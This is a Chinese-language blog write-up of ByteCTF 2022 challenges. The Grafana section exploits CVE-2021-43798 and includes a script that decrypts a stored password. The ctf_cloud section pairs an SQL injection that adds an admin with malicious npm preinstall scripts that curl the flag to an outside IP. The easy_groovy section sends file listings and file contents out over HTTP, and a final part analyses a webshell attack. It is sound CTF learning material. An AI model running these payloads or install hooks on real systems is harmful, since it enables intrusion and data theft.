---
title: ByteCTF 2022 WriteUp
date: 2022-09-25 17:16:36
categories:
  - CTF
---

感觉可以抽个时间专门再学学SQL注入了...

# Web

## easy_grafana

打开题目，Grafana v8.2.6，经典CVE-2021-43798，但是原始的POC没法用，返回400，后来查了一下发现可能是中间件对URL做了标准化导致没法打，在POC中添加`#`可以顺利绕过。

<!-- more -->

![](https://hujiekang.top/images/uploads/big/babcf0697f6ee29b68b6e644dc861820.png)

读取配置文件`/etc/grafana/grafana.ini`，发现SecretKey：

```http
secret_key = SW2YcwTIb9zpO1hoPsMm
```

然后就是脱裤`/var/lib/grafana/grafana.db`，在`data_source`表中的`secure_json_data`列中找到加密后的登录密码：

```json
{"password":"b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6/"}
```

随便Github找了个脚本解密即可：

```python
import base64
from hashlib import pbkdf2_hmac
from Crypto.Cipher import AES

saltLength = 8
aesCfb = "aes-cfb"
aesGcm = "aes-gcm"
encryptionAlgorithmDelimiter = '*'
nonceByteSize = 12


def decrypt(payload, secret):
    alg, payload, err = deriveEncryptionAlgorithm(payload)

    if err is not None:
        return None, err

    if len(payload) < saltLength:
        return None, "Unable to compute salt"

    salt = payload[:saltLength]
    key, err = encryptionKeyToBytes(secret, salt)

    if err is not None:
        return None, err

    if alg == aesCfb:
        return decryptCFB(payload, key)
    elif alg == aesGcm:
        return decryptGCM(payload, key)

    return None, None

def encryptionKeyToBytes(secret, salt):
    return pbkdf2_hmac("sha256", secret.encode("utf-8"), salt, 10000, 32), None

def deriveEncryptionAlgorithm(payload):
    if len(payload) == 0:
        return "", None, "Unable to derive encryption"

    if payload[0] != encryptionAlgorithmDelimiter.encode():
        return aesCfb, payload, None

    payload = payload[:1]

def decryptGCM(payload, key):
    nonce = payload[saltLength: saltLength+nonceByteSize]
    payload = payload[saltLength+nonceByteSize:]

    gcm = AES.new(key, AES.MODE_GCM, nonce, segment_size=128)

    return gcm.decrypt(payload).decode(), None


def decryptCFB(payload, key):
    if len(payload) < AES.block_size:
        return None, "Payload too short"

    iv = payload[saltLength: saltLength + AES.block_size]
    payload = payload[saltLength+AES.block_size:]

    cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)

    return cipher.decrypt(payload).decode(), None

if __name__ == "__main__":
    grafanaIni_secretKey = "SW2YcwTIb9zpO1hoPsMm"
    dataSourcePassword = "b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6/"

    encrypted = base64.b64decode(dataSourcePassword.encode())
    pwdBytes, _ = decrypt(encrypted, grafanaIni_secretKey)
    print(pwdBytes)
```

### Reference

- [pedrohavay/exploit-grafana-CVE-2021-43798](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798)
- [Grafana 文件读取漏洞分析与汇总(CVE-2021-43798) - CTF+](https://ctf.plus/archives/1725)

## ctf_cloud

题目点进去有注册和登录，附件给了源码，顺手就找到了注册和登录的路由：

```javascript
/* login */
router.post('/signin', function(req, res, next) {
    var username = req.body.username;
    var password = req.body.password;

    if (username == '' || password == '')
        return res.json({"code" : -1 , "message" : "Please input username and password."});

    if (!passwordCheck(password))
        return res.json({"code" : -1 , "message" : "Password is not valid."});

    db.get("SELECT * FROM users WHERE NAME = ? AND PASSWORD = ?", [username, password], function(err, row) {
        if (err) {
            console.log(err);
            return res.json({"code" : -1, "message" : "Error executing SQL query"});
        }
        if (!row) {
            return res.json({"code" : -1 , "msg" : "Username or password is incorrect"});
        }
        req.session.is_login = 1;
        if (row.NAME === "admin" && row.PASSWORD == password && row.ACTIVE == 1) {
            req.session.is_admin = 1;
        }
        return res.json({"code" : 0, "message" : "Login successful"});
    });

});

/* register */
router.post('/signup', function(req, res, next) {
    var username = req.body.username;
    var password = req.body.password;

    if (username == '' || password == '')
        return res.json({"code" : -1 , "message" : "Please input username and password."});

    // check if username exists
    db.get("SELECT * FROM users WHERE NAME = ?", [username], function(err, row) {
        if (err) {
            console.log(err);
            return res.json({"code" : -1, "message" : "Error executing SQL query"});
        }
        if (row) {
            console.log(row)
            return res.json({"code" : -1 , "message" : "Username already exists"});
        } else {
            // in case of sql injection , I'll reset admin's password to a new random string every time.
            var randomPassword = stringRandom(100);
            db.run(`UPDATE users SET PASSWORD = '${randomPassword}' WHERE NAME = 'admin'`, ()=>{});

            // insert new user
            var sql = `INSERT INTO users (NAME, PASSWORD, ACTIVE) VALUES (?, '${password}', 0)`;
            db.run(sql, [username], function(err) {
                if (err) {
                    console.log(err);
                    return res.json({"code" : -1, "message" : "Error executing SQL query " + sql});
                }
                return res.json({"code" : 0, "message" : "Sign up successful"});
            });
        }
    });
});
```

可以看见登录的时候用了直接用的占位符+传参，所以没法注入；但是在注册的地方，插入数据的时候用的是拼接（焯为啥打比赛的时候没看见啊），于是可以通过这里注入。

结合登录的判断逻辑，再加上每次新建用户都会导致管理员密码的更改，所以通过`UPDATE`的方法大概是不太行。然后发现数据表中所有列都不是`UNIQUE`属性，也就意味着可以重复，此处就可以直接通过注入直接注册一个新的admin，新建用户密码如下即可。

```
',0),('admin','123456',1),('test','
```

然后通过`admin 123456`就能以管理员身份登录，登进去是个CTF云的啥界面：

![](https://hujiekang.top/images/uploads/big/52a9ab5291597f63242dc4db81b497e1.png)

继续看源码，发现在public目录下有个app目录，长下面这样：

![](https://hujiekang.top/images/uploads/big/f479ed9ff58c6eb912463aee6f5bb231.png)

功能点是可以上传文件到public/uploads目录下，还可以在package.json中添加依赖，并且管理员可以对该目录下的整个Node.js项目进行安装，对应如下代码：

```javascript
/* run npm install */
router.post('/run', function(req, res, next) {
    if (!req.session.is_admin)
        return res.json({"code" : -1 , "message" : "Please login as admin."});
    cp.exec('cd ' + appPath + ' && npm i --registry=https://registry.npm.taobao.org', function(err, stdout, stderr) {
        if (err) {
            return res.json({"code" : -1 , "message" : "Error running npm install."});
        }
        return res.json({"code" : 0 , "message" : "Run npm install successful"});
    });
});
```

查询NPM官方文档可知，在执行`npm install`的整个过程中，会有一些生命周期的操作，使得指定的命令/脚本可以在整个过程的某个特殊节点自动执行。因此可以通过装载一些恶意命令到某个生命周期节点中，这样点击编译，就可以自动执行。

新建一个Github仓库，创建package.json文件，添加个preinstall脚本，然后通过依赖把这个自定义仓库载入进来，就能实现RCE。

```json
{
  "name": "express",
  "description": "Fast, unopinionated, minimalist web framework",
  "version": "4.18.1",
  "author": "TJ Holowaychuk <tj@vision-media.ca>",
  "scripts": {
    "preinstall": "curl http://IP:PORT/`cat /flag`"
  }
}
```

随后添加依赖，POST数据：

```json
{"dependencies":{"test":"git+https://github.com/account/test.git"}}
```

赛后复现的时候不知道是不是网络原因，拉Github仓库经常没反应，所以经常收不到请求，或者需要等很久才能收到。

![](https://hujiekang.top/images/uploads/big/0da313f4318752c7ed1599e387aca8a4.png)

因此看了其他人的WriteUp，因为Dockerfile里面给了文件的位置，所以还可以通过本地文件来载入依赖。写一个package.json上传，然后把public/uploads目录当作一个Node.js项目进行安装即可。

```json
{
    "name": "express",
    "description": "Fast, unopinionated, minimalist web framework",
    "version": "4.18.1",
    "author": "TJ Holowaychuk <tj@vision-media.ca>",
    "scripts": {
        "preinstall": "cat /flag > /usr/local/app/public/a.txt",
        "install": "cat /flag > /usr/local/app/public/b.txt",
        "postinstall": "cat /flag > /usr/local/app/public/c.txt",
        "preprepare": "cat /flag > /usr/local/app/public/d.txt",
        "prepare": "cat /flag > /usr/local/app/public/e.txt",
        "postprepare": "cat /flag > /usr/local/app/public/f.txt"
    }
}
```

添加依赖：

```json
{"dependencies":{"test":"file:./public/uploads"}}
```

随后直接访问根目录下对应文件即可。经过上面的package.json对安装过程的所有生命周期节点都测试了一遍，发现`preprepare`和`postprepare`没有写入，其他的都写入了文件。

![](https://hujiekang.top/images/uploads/big/e1cc772f6c32c29ab24be4fb4b959135.png)

包括上面这两点，NPM的`dependencies`支持以下方式加载依赖：

- 从NPM仓库加载，因此也可以把上面的恶意包打包成NPM包来加载，就是略显麻烦hhh
  - `"package": "version"`
- 从URL加载Tarball形式的包
- 从Git仓库链接加载
  - `git+ssh://git@github.com:npm/cli.git#v1.0.27`
  - `git+ssh://git@github.com:npm/cli#semver:^5.0` 
  - `git+https://isaacs@github.com/npm/cli.git` 
  - `git://github.com/npm/cli.git#v1.0.27`
- 本地目录
  - `"bar": "file:../foo/bar"`

### Reference

- [scripts | npm Docs (npmjs.com)](https://docs.npmjs.com/cli/v8/using-npm/scripts#npm-install)
- [package.json | npm Docs (npmjs.com)](https://docs.npmjs.com/cli/v8/configuring-npm/package-json#dependencies)

## typing_game

// TODO

# Misc

## signin

一堆纯前端的关卡，最后请求`/api/signin`，需要传参队伍名称和ID，但是不知道队伍ID是啥，于是乎爆破：

![](https://hujiekang.top/images/uploads/big/73f4163bbd8a1772942256d530188eee.png)

## easy_groovy

一个带过滤的Groovy代码执行，试过了Groovy的命令执行代码`"ls".execute()`，显示被ban，因此尝试使用Groovy的API直接看看能不能读取到flag。

首先是扫目录，因为无回显，所以需要通过HTTP请求将结果带出来：

```groovy
def files=new java.io.File("/").listFiles();
for(f in files) {
    new URL("http://IP:PORT/"+f.absolutePath).openConnection().getResponseCode()
}
```

![](https://hujiekang.top/images/uploads/big/59c9ce47b60cdadaf4ca0fa052929975.png)

然后读flag，简单粗暴：

```groovy
def file=new java.io.File("/flag");
def line;
file.withReader {
    reader -> while((line = reader.readLine()) != null){ 
        new URL("http://IP:PORT/" + line).openConnection().getResponseCode()
    }
}
```

![](https://hujiekang.top/images/uploads/big/f9e587fd0fdb667e3af72e5bd7990a37.png)

## find_it

下载附件，是个`.scap`文件，一搜还以为是UEFI固件，然后用`file`确认了一下，原来是个流量包hhh

![](https://hujiekang.top/images/uploads/medium/c5577422032f2dc5eb2e2d71ef54adf4.png)

是一个记录了系统调用序列的流量包，首先filter了一下命令执行的，也就是`execve()`，对应Wireshark里面的调用号是293，规则`sysdig.event_type==293`，在最后几个数据中找到了一些有意思的东西：

首先是这个`sh -c`，后面的`echo`一眼看出是蚁剑的定界符，所以猜测可能有Webshell的写入操作：

![](https://hujiekang.top/images/uploads/big/4b05ec116f0014384f97fe01cc6dad11.png)

以及下面这个一句话木马的写入操作，更确定了这个猜测：

![](https://hujiekang.top/images/uploads/big/484beac7115e91add986c9361d8f5ce3.png)

在对Web日志的写入调用中发现了写一句话的具体URI，还是个ThinkPHP：

![](https://hujiekang.top/images/uploads/big/249f3a6f02b5c711090a3f1c09f1ff70.png)

紧跟在`bash nothing.sh`之后的是一个`openssl`加密命令，能推测出传了个图片文件nothing.png（看样子出题人也和我一样没钱恰KFC疯狂星期四捏）

![](https://hujiekang.top/images/uploads/big/7f3881c9dcbd9938b7a08b7815e1869d.png)

于是去掉filter之后，在其前面的某个`read()`调用中找到了nothing.png，扫出来是前半截flag：`bytectf{53f8fb16-a25d-4aac-`

![](https://hujiekang.top/images/uploads/big/319877a44b8f3fae93b7e48763ccbd22.png)

然后看来看去也没看见其他的命令执行了，想起前面翻到的Web日志，于是接着去找Web的请求信息，找到了这样一个`write()`调用：

![](https://hujiekang.top/images/uploads/big/f576e63bb764c459e99b23b15cb3d6e5.png)

找到后半截Flag：`bec5-d7563b2672b6}`，完整`bytectf{53f8fb16-a25d-4aac-bec5-d7563b2672b6}`
